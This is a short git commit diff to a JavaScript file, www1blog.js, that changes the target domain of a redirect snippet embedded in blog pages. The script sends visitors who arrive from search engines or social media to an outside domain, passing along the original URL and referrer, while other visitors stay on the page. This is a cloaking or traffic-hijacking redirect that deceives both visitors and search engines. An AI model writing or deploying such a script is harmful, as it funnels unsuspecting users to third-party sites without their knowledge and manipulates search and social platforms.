0cc58eedb886b78b3945de30ec8b242dad86b8e7
aryvkurniawan <41510833+aryvkurniawan@users.noreply.github.com>
2021-05-17 22:36:14 +0700

    Update www1blog.js

--- www1blog.js
+++ www1blog.js
@@ -1,6 +1,6 @@
 <script>
   //<![CDATA[
-var ars = 'https://www1.damarkita.com';
+var ars = 'https://prinzessin.my.id';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
 //]]>
